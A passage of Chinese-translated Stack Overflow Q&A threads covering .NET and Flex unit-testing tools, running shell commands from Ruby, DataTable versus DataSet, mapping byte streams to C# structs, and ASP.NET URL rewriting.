> 时间：2008-08-05T12:51:47.990

NUnit 一直是我的最爱。但是，如果您使用 TFS 作为源代码控制，我建议您坚持使用 Microsoft Stack。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-10-15T14:24:18.690

我推荐以下内容：

**TestDriven.NET** - VS 的单元测试插件，与所有主要单元测试框架（包括 NUnit、MbUnit 等）完全集成......

**Typemock Isolator -** [.Net 单元测试](http://www.typemock.com/Docs/writing_unit_tests_with_isolator.html)的模拟框架

**[NUnit](http://www.nunit.org)** - C# 中的开源单元测试框架。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-06-17T12:48:36.297

对于我的项目，我使用 NUnit 和 TestDriven.NET 取得了巨大成功。您可以创建一个单独的库来托管您的测试代码，也可以将其放入您的可执行文件或库中。这完全取决于您是否希望生产代码与测试代码交织在一起。

对于依赖注入，我在当前项目中使用[NInject](http://www.ninject.org/ "N注入")并且效果很好。如果您使用构造函数注入，则无需使用 [Inject] 属性使代码混乱。

我没有为我的 .NET 2.0 项目使用模拟库，但对于另一个 .NET 3.5 项目，我将使用[Moq](http://code.google.com/p/moq/ "起订量")。

请注意，所有这些都适用于 .NET 2.0 及更高版本。（起订量除外）

# apache-flex - 如何从 IDE 或构建脚本中对 Flex 应用程序进行单元测试？

> ID：2222
> 
> 赞同：18
> 
> 时间：2008-08-05T12:52:42.573
> 
> 标签：apache-flex, eclipse, unit-testing, build-automation, cairngorm

我目前正在开发一个使用 Adob​​e Flex 3 编写的前端应用程序。我知道[FlexUnit](http://code.google.com/p/as3flexunitlib/)，但我真正想要的是 Ant/NAnt 的单元测试运行程序和与 Flex Builder IDE 集成的运行程序（又名日食）。一个存在吗？

[此外，除了Cairngorm 微架构](http://labs.adobe.com/wiki/index.php/Cairngorm)示例之外，还有其他关于如何“以正确方式”进行 Flex 开发的资源吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-08-12T12:28:18.340

[dpUint](http://code.google.com/p/dpuint/)测试框架有一个使用 AIR 构建的测试运行器，可以与构建脚本集成。

还有我的[FlexUnit](http://developer.iconara.net/objectlib/flexunitautomation.html)自动化套件，它或多或少对 FlexUnit 做同样的事情。它有一个 Ant 宏，可以将测试作为 Ant 脚本的一部分运行，例如：

```
<target name="run-tests" depends="compile-tests">
  <flexunit swf="${build.home}/tests.swf" failonerror="true"/>
</target> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-13T19:04:42.797

在我的项目中，我们使用 Maven 来构建我们的 Flex RIA 和基于 Java 的后端。为了构建和测试 Flex 应用程序，我们使用[flex-mojos](http://code.google.com/p/flex-mojos/) maven 插件。他们为我们做得很好，我强烈建议使用 Maven 而不是 Ant。

话虽如此，如果您已经在使用 Ant，那么过渡到 Maven 可能会有些棘手。因此，如果您处于该位置，我建议您使用此处提供的 flexunit 任务：[Ant Task](http://docs.flexunit.org/index.php?title=Ant_Task)

这两个库的作用基本相同，它们在窗口中启动生成的 flexunit 测试运行程序 mxml 应用程序，并使用 JUnit 测试运行程序打开返回到构建过程的套接字连接。令人惊讶的是，它工作得很好。唯一的问题是你不能无头运行它，所以如果你想从 CI 服务器运行构建，你必须确保该进程能够启动新窗口，否则它将无法工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-12T12:36:52.080

关于如何以正确的方式开发 Flex 应用程序，我不会过多关注 Cairngorm 框架。它确实声称展示了“最佳实践”等等，但我想说恰恰相反。它基于全局变量的使用，以及您应该尽量避免的其他事情。我已经[在我的博客上概述了一些问题](http://blog.iconara.net/2008/04/13/architectural-atrocities-part-x-cairngorms-model-locator-pattern/)。

我建议您改用[Mate 框架](http://mate.asfusion.com)，它有很好的文档和很好的示例来帮助您前进。它充分发挥了 Flex 的潜力，不像 Cairngorm 和 PureMVC 那样依赖全局变量，并且可以编写更多解耦的代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-20T02:37:58.303

FlexUnit 的替代品是[AsUnit](http://www.asunit.org/)测试工具。actionscript 2 和 3 有两个版本。它还与 Project Sprouts 有很好的集成，[Project Sprouts](http://www.projectsprouts.org/)是一个类似于 ant 的 Flex 和 Flash 构建工具，但是它使用 ruby​​ rake 任务并包括沿 maven 行的优秀依赖管理。

但是，我不知道没有 IDE 集成。

# ruby - 如何从 Ruby 调用 shell 命令

> ID：2232
> 
> 赞同：1208
> 
> 时间：2008-08-05T12:56:52.770
> 
> 标签：ruby, shell, interop

如何从 Ruby 程序内部调用 shell 命令？然后如何将这些命令的输出返回到 Ruby？

* * *

## 回答 #1

> 赞同：1434
> 
> 时间：2008-08-05T14:42:45.927

这个解释是基于我朋友的一个评论的[Ruby 脚本。](http://gist.github.com/4069)如果您想改进脚本，请随时在链接上更新它。

首先，请注意，当 Ruby 调用 shell 时，它通常调用的是`/bin/sh`，*而不是*Bash。并非`/bin/sh`所有系统都支持某些 Bash 语法。

以下是执行 shell 脚本的方法：

```
cmd = "echo 'hi'" # Sample string that can be used 
```

1.  `Kernel#``，通常称为反引号 –``cmd``

    这与许多其他语言一样，包括 Bash、PHP 和 Perl。

    返回 shell 命令的结果（即标准输出）。

    文档：[http ://ruby-doc.org/core/Kernel.html#method-i-60](http://ruby-doc.org/core/Kernel.html#method-i-60)

    ```
    value = `echo 'hi'`
    value = `#{cmd}` 
    ```

2.  内置语法，`%x( cmd )`

    字符`x`后面是分隔符，可以是任何字符。如果定界符是字符`(`、`[`、`{`或之一`<`，则文字由直到匹配的结束定界符为止的字符组成，同时考虑到嵌套定界符对。对于所有其他定界符，文字包含直到下一次出现定界符的字符。`#{ ... }`允许字符串插值。

    返回 shell 命令的结果（即标准输出），就像反引号一样。

    文档：[https ://docs.ruby-lang.org/en/master/syntax/literals_rdoc.html#label-Percent+Strings](https://docs.ruby-lang.org/en/master/syntax/literals_rdoc.html#label-Percent+Strings)

    ```
    value = %x( echo 'hi' )
    value = %x[ #{cmd} ] 
    ```

3.  `Kernel#system`

    在子 shell 中执行给定的命令。

    `true`如果找到并成功运行命令，则返回，`false`否则返回。

    文档：[http ://ruby-doc.org/core/Kernel.html#method-i-system](http://ruby-doc.org/core/Kernel.html#method-i-system)

    ```
    wasGood = system( "echo 'hi'" )
    wasGood = system( cmd ) 
    ```

4.  `Kernel#exec`

    通过运行给定的外部命令替换当前进程。

    返回无，当前进程被替换并且永不继续。

    文档：[http ://ruby-doc.org/core/Kernel.html#method-i-exec](http://ruby-doc.org/core/Kernel.html#method-i-exec)

    ```
    exec( "echo 'hi'" )
    exec( cmd ) # Note: this will never be reached because of the line above 
    ```

这里有一些额外的建议： `$?`与 相同`$CHILD_STATUS`，如果您使用反引号，则访问最后一个系统执行命令的状态，`system()`或者`%x{}`。然后您可以访问`exitstatus`和`pid`属性：

```
$?.exitstatus 
```

更多阅读请参见：

*   [http://www.elctech.com/blog/im-in-ur-commandline-executin-ma-commands](http://www.elctech.com/blog/i-m-in-ur-commandline-executin-ma-commands)
*   [http://blog.jayfields.com/2006/06/ruby-kernel-system-exec-and-x.html](http://blog.jayfields.com/2006/06/ruby-kernel-system-exec-and-x.html)
*   [http://tech.natemurray.com/2007/03/ruby-shell-commands.html](http://tech.natemurray.com/2007/03/ruby-shell-commands.html)

* * *

## 回答 #2

> 赞同：377
> 
> 时间：2016-05-19T17:01:00.407

这是一个基于“[何时使用在 Ruby 中启动子进程的每种方法](https://stackoverflow.com/questions/7212573/when-to-use-each-method-of-launching-a-subprocess-in-ruby/7263556#7263556)”的流程图。另请参阅“[欺骗应用程序使其认为其标准输出是终端，而不是管道](https://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdout-is-a-terminal-not-a-pipe/1402389#1402389)”。

[![在此处输入图像描述](../Images/2d4b4774a2194d00b30c4ee59013b236.png)](https://i.stack.imgur.com/1Vuvp.png)

* * *

## 回答 #3

> 赞同：165
> 
> 时间：2008-08-05T14:08:13.360

我喜欢这样做的方式是使用`%x`文字，这使得在命令中使用引号变得容易（并且可读！），如下所示：

```
directorylist = %x[find . -name '*test.rb' | sort] 
```

在这种情况下，它将使用当前目录下的所有测试文件填充文件列表，您可以按预期进行处理：

```
directorylist.each do |filename|
  filename.chomp!
  # work with file
end 
```

* * *

## 回答 #4

> 赞同：67
> 
> 时间：2008-09-02T11:05:10.150

这是我认为关于在 Ruby 中运行 shell 脚本的最佳文章：“在 Ruby[中运行 shell 命令的 6 种方法](http://tech.natemurray.com/2007/03/ruby-shell-commands.html)”。

如果您只需要获取输出，请使用反引号。

我需要更高级的东西，比如 STDOUT 和 STDERR，所以我使用了 Open4 gem。你有那里解释的所有方法。

* * *

## 回答 #5

> 赞同：45
> 
> 时间：2008-09-18T17:47:37.083

我最喜欢的是[Open3](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/open3/rdoc/Open3.html)

```
 require "open3"

  Open3.popen3('nroff -man') { |stdin, stdout, stderr| ... } 
```

* * *

## 回答 #6

> 赞同：31
> 
> 时间：2008-08-07T05:10:35.627

在这些机制之间进行选择时需要考虑的一些事项是：

1.  你只想要标准输出还是也需要标准错误？甚至分开？
2.  你的输出有多大？您想将整个结果保存在内存中吗？
3.  您想在子进程仍在运行时读取一些输出吗？
4.  您需要结果代码吗？
5.  您是否需要一个 Ruby 对象来表示该进程并让您按需终止它？

您可能需要任何东西，从简单的反引号 (``),`system()`到`IO.popen`完整的`Kernel.fork`/`Kernel.exec`和`IO.pipe`and `IO.select`。

如果子流程执行时间过长，您可能还想在混合中加入超时。

不幸的是，这在很大程度上***取决于***.

* * *

## 回答 #7

> 赞同：27
> 
> 时间：2008-08-05T13:24:16.160

我绝对不是 Ruby 专家，但我会试一试：

```
$ irb 
system "echo Hi"
Hi
=> true 
```

您还应该能够执行以下操作：

```
cmd = 'ls'
system(cmd) 
```

* * *

## 回答 #8

> 赞同：27
> 
> 时间：2010-06-16T02:13:05.643

另一种选择：

当你：

*   需要标准错误和标准输出
*   不能/不会使用 Open3/Open4（他们在我的 Mac 上的 NetBeans 中抛出异常，不知道为什么）

您可以使用外壳重定向：

```
puts %x[cat bogus.txt].inspect
  => ""

puts %x[cat bogus.txt 2>&1].inspect
  => "cat: bogus.txt: No such file or directory\n" 
```

自 MS-DOS 早期以来，该`2>&1`语法适用于[Linux](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-3.html)、Mac 和[Windows 。](http://support.microsoft.com/kb/110930)

* * *

## 回答 #9

> 赞同：23
> 
> 时间：2013-06-07T02:07:04.197

上面的答案已经很不错了，但是我真的很想分享以下总结文章：“ [6 Ways to Run Shell Commands in Ruby](http://tech.natemurray.com/2007/03/ruby-shell-commands.html) ”

基本上，它告诉我们：

`Kernel#exec`：

```
exec 'echo "hello $HOSTNAME"' 
```

`system`和`$?`：

```
system 'false' 
puts $? 
```

反引号 (`)：

```
today = `date` 
```

`IO#popen`：

```
IO.popen("date") { |f| puts f.gets } 
```

`Open3#popen3`-- 标准库：

```
require "open3"
stdin, stdout, stderr = Open3.popen3('dc') 
```

`Open4#popen4`——一颗宝石：

```
require "open4" 
pid, stdin, stdout, stderr = Open4::popen4 "false" # => [26327, #<IO:0x6dff24>, #<IO:0x6dfee8>, #<IO:0x6dfe84>] 
```

* * *

## 回答 #10

> 赞同：18
> 
> 时间：2017-06-02T20:14:02.687

如果您真的需要 Bash，请按照“最佳”答案中的说明。

> 首先，请注意，当 Ruby 调用 shell 时，它通常调用的是`/bin/sh`，*而不是*Bash。并非`/bin/sh`所有系统都支持某些 Bash 语法。

如果您需要使用 Bash，`bash -c "your Bash-only command"`请在所需的调用方法中插入：

```
quick_output = system("ls -la") 
```

```
quick_bash = system("bash -c 'ls -la'") 
```

去测试：

```
system("echo $SHELL")
system('bash -c "echo $SHELL"') 
```

或者，如果您正在运行现有的脚本文件，例如

```
script_output = system("./my_script.sh") 
```

Ruby*应该*尊重 shebang，但你总是可以使用

```
system("bash ./my_script.sh") 
```

为了确保，虽然`/bin/sh`运行可能会有一点开销`/bin/bash`，但您可能不会注意到。

* * *

## 回答 #11

> 赞同：12
> 
> 时间：2008-08-05T13:57:47.233

您还可以使用反引号运算符 (`)，类似于 Perl：

```
directoryListing = `ls /`
puts directoryListing # prints the contents of the root directory 
```

如果你需要一些简单的东西很方便。

您要使用哪种方法取决于您要完成的工作。检查文档以获取有关不同方法的更多详细信息。

* * *

## 回答 #12

> 赞同：11
> 
> 时间：2012-02-19T18:07:16.460

我们可以通过多种方式实现它。

使用`Kernel#exec`, 执行此命令后没有任何内容：

```
exec('ls ~') 
```

使用`backticks or %x`

```
`ls ~`
=> "Applications\nDesktop\nDocuments"
%x(ls ~)
=> "Applications\nDesktop\nDocuments" 
```

使用`Kernel#system`命令，`true`成功返回，`false`失败返回`nil`，命令执行失败返回：

```
system('ls ~')
=> true 
```

* * *

## 回答 #13

> 赞同：11
> 
> 时间：2012-02-20T23:36:45.490

使用这里的答案和 Mihai 的答案中的链接，我整理了一个满足这些要求的函数：

1.  整齐地捕获 STDOUT 和 STDERR，因此当我的脚本从控制台运行时它们不会“泄漏”。
2.  允许将参数作为数组传递给 shell，因此无需担心转义。
3.  捕获命令的退出状态，以便在发生错误时一目了然。

作为奖励，如果 shell 命令成功退出 (0) 并将任何内容放在 STDOUT 上，此命令也将返回 STDOUT。以这种方式，它与 不同`system`，后者在这种情况下简单地返回`true`。

代码如下。具体功能是`system_quietly`：

```
require 'open3'

class ShellError < StandardError; end

#actual function:
def system_quietly(*cmd)
  exit_status=nil
  err=nil
  out=nil
  Open3.popen3(*cmd) do |stdin, stdout, stderr, wait_thread|
    err = stderr.gets(nil)
    out = stdout.gets(nil)
    [stdin, stdout, stderr].each{|stream| stream.send('close')}
    exit_status = wait_thread.value
  end
  if exit_status.to_i > 0
    err = err.chomp if err
    raise ShellError, err
  elsif out
    return out.chomp
  else
    return true
  end
end

#calling it:
begin
  puts system_quietly('which', 'ruby')
rescue ShellError
  abort "Looks like you don't have the `ruby` command. Odd."
end

#output: => "/Users/me/.rvm/rubies/ruby-1.9.2-p136/bin/ruby" 
```

* * *

## 回答 #14

> 赞同：11
> 
> 时间：2015-11-04T15:04:26.450

不要忘记`spawn`创建后台进程来执行指定命令的命令。`Process`您甚至可以使用类和返回的内容等待其完成`pid`：

```
pid = spawn("tar xf ruby-2.0.0-p195.tar.bz2")
Process.wait pid

pid = spawn(RbConfig.ruby, "-eputs'Hello, world!'")
Process.wait pid 
```

文档说：此方法类似于`#system`但它不等待命令完成。

* * *

## 回答 #15

> 赞同：11
> 
> 时间：2017-03-30T18:13:13.853

最简单的方法是，例如：

```
reboot = `init 6`
puts reboot 
```

* * *

## 回答 #16

> 赞同：8
> 
> 时间：2017-02-16T09:58:31.277

反引号 (`) 方法是从 Ruby 调用 shell 命令的最简单方法。它返回 shell 命令的结果：

```
 url_request = 'http://google.com'
     result_of_shell_command = `curl #{url_request}` 
```

* * *

## 回答 #17

> 赞同：7
> 
> 时间：2015-12-11T14:57:01.603

如果您有比普通案例更复杂且无法处理的案例，````请查看 [`Kernel.spawn()`](http://ruby-doc.org/core-1.9.3/Kernel.html#method-i-spawn)。这似乎是 Ruby 提供的用于执行外部命令的最通用/功能最全面的。

您可以使用它来：

*   创建进程组 (Windows)。
*   将输入、输出、错误重定向到文件/彼此。
*   设置环境变量，umask。
*   在执行命令之前更改目录。
*   为 CPU/数据/等设置资源限制。
*   做所有可以在其他答案中使用其他选项完成的事情，但需要更多代码。

[Ruby 文档](http://ruby-doc.org/core-1.9.3/Kernel.html#method-i-spawn)有足够好的示例：

```
env: hash
  name => val : set the environment variable
  name => nil : unset the environment variable
command...:
  commandline                 : command line string which is passed to the standard shell
  cmdname, arg1, ...          : command name and one or more arguments (no shell)
  [cmdname, argv0], arg1, ... : command name, argv[0] and zero or more arguments (no shell)
options: hash
  clearing environment variables:
    :unsetenv_others => true   : clear environment variables except specified by env
    :unsetenv_others => false  : dont clear (default)
  process group:
    :pgroup => true or 0 : make a new process group
    :pgroup => pgid      : join to specified process group
    :pgroup => nil       : dont change the process group (default)
  create new process group: Windows only
    :new_pgroup => true  : the new process is the root process of a new process group
    :new_pgroup => false : dont create a new process group (default)
  resource limit: resourcename is core, cpu, data, etc.  See Process.setrlimit.
    :rlimit_resourcename => limit
    :rlimit_resourcename => [cur_limit, max_limit]
  current directory:
    :chdir => str
  umask:
    :umask => int
  redirection:
    key:
      FD              : single file descriptor in child process
      [FD, FD, ...]   : multiple file descriptor in child process
    value:
      FD                        : redirect to the file descriptor in parent process
      string                    : redirect to file with open(string, "r" or "w")
      [string]                  : redirect to file with open(string, File::RDONLY)
      [string, open_mode]       : redirect to file with open(string, open_mode, 0644)
      [string, open_mode, perm] : redirect to file with open(string, open_mode, perm)
      [:child, FD]              : redirect to the redirected file descriptor
      :close                    : close the file descriptor in child process
    FD is one of follows
      :in     : the file descriptor 0 which is the standard input
      :out    : the file descriptor 1 which is the standard output
      :err    : the file descriptor 2 which is the standard error
      integer : the file descriptor of specified the integer
      io      : the file descriptor specified as io.fileno
  file descriptor inheritance: close non-redirected non-standard fds (3, 4, 5, ...) or not
    :close_others => false : inherit fds (default for system and exec)
    :close_others => true  : dont inherit (default for spawn and IO.popen) 
```

* * *

## 回答 #18

> 赞同：7
> 
> 时间：2017-12-19T05:54:55.970

给定如下命令`attrib`：

```
require 'open3'

a="attrib"
Open3.popen3(a) do |stdin, stdout, stderr|
  puts stdout.read
end 
```

我发现虽然这种方法不像

```
system("thecommand") 
```

或者

```
`thecommand` 
```

在反引号中，与其他方法相比，这种方法的一个好处是反引号似乎不允许`puts`我运行命令/将要运行的命令存储在变量中，并且`system("thecommand")`似乎不允许我获得输出而这个方法让我可以做这两件事，它让我可以独立访问标准输入、标准输出和标准错误。

请参阅“[在 ruby​​ 中执行命令](https://blog.bigbinary.com/2012/10/18/backtick-system-exec-in-ruby.html)”和[Ruby 的 Open3 文档](http://ruby-doc.org/stdlib-2.4.1/libdoc/open3/rdoc/Open3.html)。

* * *

## 回答 #19

> 赞同：4
> 
> 时间：2018-07-05T12:55:22.717

这不是一个真正的答案，但也许有人会发现它很有用：

在 Windows 上使用 TK GUI 时，你需要从 ruby​​w 调用 shell 命令，你总会有一个烦人的 CMD 窗口弹出不到一秒钟。

为避免这种情况，您可以使用：

```
WIN32OLE.new('Shell.Application').ShellExecute('ipconfig > log.txt','','','open',0) 
```

或者

```
WIN32OLE.new('WScript.Shell').Run('ipconfig > log.txt',0,0) 
```

两者都将`ipconfig`输出存储在内部`log.txt`，但不会出现任何窗口。

你需要`require 'win32ole'`在你的脚本里面。

`system()`，`exec()`并且`spawn()`在使用 TK 和 ruby​​w 时都会弹出那个烦人的窗口。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2021-12-06T19:02:51.737

不确定shell命令。我使用以下将系统命令的输出捕获到变量**val**中：

```
val = capture(:stdout) do
  system("pwd")
end

puts val 
```

缩短版：

```
val = capture(:stdout) { system("pwd") } 
```

**捕获**方法由*active_support/core_ext/kernel/reporting.rb 提供*

同样，我们也可以捕获标准错误`:stderr`

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2022-01-05T16:44:57.903

您可以使用`format`以下方法打印一些信息：

```
puts format('%s', `ps`)
puts format('%d MB', (`ps -o rss= -p #{Process.pid}`.to_i / 1024)) 
```

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2014-10-14T20:12:11.300

这是我在 OS X 上的 ruby​​ 脚本中使用的一个很酷的脚本（这样即使在离开窗口后我也可以启动脚本并获取更新）：

```
cmd = %Q|osascript -e 'display notification "Server was reset" with title "Posted Update"'|
system ( cmd ) 
```

# c# - 数据表与数据集

> ID：2250
> 
> 赞同：139
> 
> 时间：2008-08-05T13:07:40.563
> 
> 标签：c#, dataset, datatable

我目前使用 DataTable 从可以在我的代码中使用的数据库中获取结果。

但是，网络上的许多示例显示使用 DataSet 并通过集合方法访问表。

使用 DataSets 或 DataTables 作为 SQL 结果的存储方法是否有任何优势，无论是性能方面还是其他方面？

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2008-08-05T13:12:15.873

这实际上取决于您要带回的数据类型。由于 DataSet（实际上）只是 DataTable 对象的集合，因此您可以将多个不同的数据集返回到单个对象中，因此更易于管理。

在性能方面，您更有可能从未优化的查询中获得低效率，而不是从 .NET 构造的“错误”选择中获得。至少，这是我的经验。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2008-09-14T03:07:27.670

一个主要区别是 DataSet 可以包含多个表，并且您可以定义这些表之间的关系。

如果您只返回一个结果集，但我认为 DataTable 会更加优化。我认为必须有一些开销（授予小）来提供 DataSet 的功能并跟踪多个 DataTables。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-08-05T13:10:26.487

在 1.x 中，曾经有 DataTables 无法做到的 DataSets 可以做到的事情（不记得具体是什么）。所有这一切都在 2.x 中发生了变化。我的猜测是这就是为什么很多示例仍然使用 DataSet 的原因。DataTables 应该更快，因为它们更轻量级。如果您只提取一个结果集，那么它是两者之间的最佳选择。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-08-05T13:15:53.713

DataSet 的一个特性是，如果您可以在存储过程中调用多个 select 语句，则 DataSet 将为每个语句提供一个 DataTable。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-14T02:55:38.773

在填充 DataTable 时可以使用一些优化，例如调用 BeginLoadData()、插入数据，然后调用 EndLoadData()。这会关闭 DataTable 中的一些内部行为，例如索引维护等。有关详细信息，请参阅[本文](https://blogs.objectsharp.com/post/2004/04/18/How-can-I-improve-the-loading-of-my-datasets.aspx)。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-12-05T15:50:19.993

无论如何，当您只处理单个表时，我发现最大的实际区别是 DataSet 有一个“HasChanges”方法，而 DataTable 没有。但是，两者都有一个“GetChanges”，因此您可以使用它并测试是否为空。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-08-30T00:45:27.147

DataTable 对象将表格数据表示为内存中的行、列和约束的表格缓存。DataSet 由一组 DataTable 对象组成，您可以使用 DataRelation 对象将这些对象相互关联起来。

# c# - 将 Stream 数据映射到 C# 中的数据结构

> ID：2256
> 
> 赞同：29
> 
> 时间：2008-08-05T13:11:14.223
> 
> 标签：c#, c++, data-structures

有没有办法将流或数组上收集的数据映射到数据结构，反之亦然？在 C++ 中，这只是将指向流的指针转换为我想要使用的数据类型（反之亦然）的问题，例如：在 C++ 中

```
Mystruct * pMyStrct = (Mystruct*)&SomeDataStream;
pMyStrct->Item1 = 25;

int iReadData = pMyStrct->Item2; 
```

显然，除非您在读取传入数据时确定流数据的质量，否则 C++ 方式是非常不安全的，但是对于传出数据来说，超级快速和简单。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-08-05T15:46:35.157

大多数人使用 .NET 序列化（有更快的二进制和更慢的 XML 格式化程序，它们都依赖于反射并且在一定程度上具有版本容错性）

但是，如果您想要最快（不安全）的方式 - 为什么不：

写作：

```
YourStruct o = new YourStruct();
byte[] buffer = new byte[Marshal.SizeOf(typeof(YourStruct))];
GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
Marshal.StructureToPtr(o, handle.AddrOfPinnedObject(), false);
handle.Free(); 
```

阅读：

```
handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
o = (YourStruct)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(YourStruct));
handle.Free(); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-10-24T11:37:39.620

如果 lubos hasko 的回答不够安全，还有一种**真正**不安全的方法，在 C# 中使用指针。以下是我遇到的一些提示和陷阱：

```
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

// Use LayoutKind.Sequential to prevent the CLR from reordering your fields.
[StructLayout(LayoutKind.Sequential)]
unsafe struct MeshDesc
{
    public byte NameLen;
    // Here fixed means store the array by value, like in C,
    // though C# exposes access to Name as a char*.
    // fixed also requires 'unsafe' on the struct definition.
    public fixed char Name[16];
    // You can include other structs like in C as well.
    public Matrix Transform;
    public uint VertexCount;
    // But not both, you can't store an array of structs.
    //public fixed Vector Vertices[512];
}

[StructLayout(LayoutKind.Sequential)]
unsafe struct Matrix
{
    public fixed float M[16];
}

// This is how you do unions
[StructLayout(LayoutKind.Explicit)]
unsafe struct Vector
{
    [FieldOffset(0)]
    public fixed float Items[16];
    [FieldOffset(0)]
    public float X;
    [FieldOffset(4)]
    public float Y;
    [FieldOffset(8)]
    public float Z;
}

class Program
{
    unsafe static void Main(string[] args)
    {
        var mesh = new MeshDesc();
        var buffer = new byte[Marshal.SizeOf(mesh)];

        // Set where NameLen will be read from.
        buffer[0] = 12;
        // Use Buffer.BlockCopy to raw copy data across arrays of primitives.
        // Note we copy to offset 2 here: char's have alignment of 2, so there is
        // a padding byte after NameLen: just like in C.
        Buffer.BlockCopy("Hello!".ToCharArray(), 0, buffer, 2, 12);

        // Copy data to struct
        Read(buffer, out mesh);

        // Print the Name we wrote above:
        var name = new char[mesh.NameLen];
        // Use Marsal.Copy to copy between arrays and pointers to arrays.
        unsafe { Marshal.Copy((IntPtr)mesh.Name, name, 0, mesh.NameLen); }
        // Note you can also use the String.String(char*) overloads
        Console.WriteLine("Name: " + new string(name));

        // If Erik Myers likes it...
        mesh.VertexCount = 4711;

        // Copy data from struct:
        // MeshDesc is a struct, and is on the stack, so it's
        // memory is effectively pinned by the stack pointer.
        // This means '&' is sufficient to get a pointer.
        Write(&mesh, buffer);

        // Watch for alignment again, and note you have endianess to worry about...
        int vc = buffer[100] | (buffer[101] << 8) | (buffer[102] << 16) | (buffer[103] << 24);
        Console.WriteLine("VertexCount = " + vc);
    }

    unsafe static void Write(MeshDesc* pMesh, byte[] buffer)
    {
        // But byte[] is on the heap, and therefore needs
        // to be flagged as pinned so the GC won't try to move it
        // from under you - this can be done most efficiently with
        // 'fixed', but can also be done with GCHandleType.Pinned.
        fixed (byte* pBuffer = buffer)
            *(MeshDesc*)pBuffer = *pMesh;
    }

    unsafe static void Read(byte[] buffer, out MeshDesc mesh)
    {
        fixed (byte* pBuffer = buffer)
            mesh = *(MeshDesc*)pBuffer;
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-08-05T13:29:07.617

如果两边都是.net：

认为您应该使用二进制序列化并发送 byte[] 结果。

相信你的结构是完全可blittable的可能会很麻烦。

您将支付一些开销（cpu 和网络），但会很安全。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-05T13:47:23.790

如果您需要手动填充每个成员变量，则可以通过使用 FormatterServices 来按顺序检索与对象关联的变量类型列表，就原语而言对其进行概括。我不得不在一个项目中执行此操作，其中我有很多不同的消息类型从流中流出，我绝对不想为每条消息编写序列化器/反序列化器。

这是我用来概括从 byte[] 反序列化的代码。

```
public virtual bool SetMessageBytes(byte[] message)
    {
        MemberInfo[] members = FormatterServices.GetSerializableMembers(this.GetType());
        object[] values = FormatterServices.GetObjectData(this, members);
        int j = 0;

        for (int i = 0; i < members.Length; i++)
        {
            string[] var = members[i].ToString().Split(new char[] { ' ' });
            switch (var[0])
            {
                case "UInt32":
                    values[i] = (UInt32)((message[j] << 24) + (message[j + 1] << 16) + (message[j + 2] << 8) + message[j + 3]);
                    j += 4;
                    break;
                case "UInt16":
                    values[i] = (UInt16)((message[j] << 8) + message[j + 1]);
                    j += 2;
                    break;
                case "Byte":
                    values[i] = (byte)message[j++];
                    break;
                case "UInt32[]":
                    if (values[i] != null)
                    {
                        int len = ((UInt32[])values[i]).Length;
                        byte[] b = new byte[len * 4];
                        Array.Copy(message, j, b, 0, len * 4);
                        Array.Copy(Utilities.ByteArrayToUInt32Array(b), (UInt32[])values[i], len);
                        j += len * 4;
                    }
                    break;
                case "Byte[]":
                    if (values[i] != null)
                    {
                        int len = ((byte[])values[i]).Length;
                        Array.Copy(message, j, (byte[])(values[i]), 0, len);
                        j += len;
                    }
                    break;
                default:
                    throw new Exception("ByteExtractable::SetMessageBytes Unsupported Type: " + var[1] + " is of type " +  var[0]);
            }
        }
        FormatterServices.PopulateObjectMembers(this, members, values);
        return true;
    } 
```

# asp.net - ASP.NET URL 重写

> ID：2262
> 
> 赞同：35
> 
> 时间：2008-08-05T13:14:48.350
> 
> 标签：asp.net, url, url-rewriting, url-routing

如何在 ASP.NET 中重写 URL？

我希望用户能够访问

```
http://www.website.com/users/smith 
```

代替

```
http://www.website.com/?user=smith 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2008-08-05T13:18:39.340

尝试托管 Fusion Url 重写器和反向代理：

[http://urlrewriter.codeplex.com](http://urlrewriter.codeplex.com)

重写它的规则是：

```
# clean up old rules and forward to new URL
RewriteRule ^/?user=(.*)  /users/$1 [NC,R=301]

# rewrite the rule internally
RewriteRule ^/users/(.*)  /?user=$1 [NC,L] 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2010-10-01T11:52:49.347

微软现在为 IIS 提供官方 URL 重写模块：[http ://www.iis.net/download/urlrewrite](http://www.iis.net/download/urlrewrite)

它支持大多数类型的重写，包括设置服务器变量和通配符。

它还将存在于所有开箱即用的 Azure Web 实例上。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-11T13:44:59.200

我已经使用 httpmodule 从[www.urlrewriting.net](http://www.urlrewriting.net/)进行 url 重写并取得了巨大成功（尽管我相信一个更早、更简单的版本）

如果您的实际重写规则很少，那么 .NET 2.0 中内置的 url 映射可能是一个更简单的选择，网上有一些关于这些的文章，[4guysfromrolla](http://aspnet.4guysfromrolla.com/articles/011007-1.aspx)似乎相当详尽，但正如您所见，他们没有支持正则表达式映射因此在动态环境中变得相当无用（假设您的示例中的“smith”不是特殊情况，那么这些将没有用）

# c# - 如何在 C# 中过滤和组合 2 个数据集

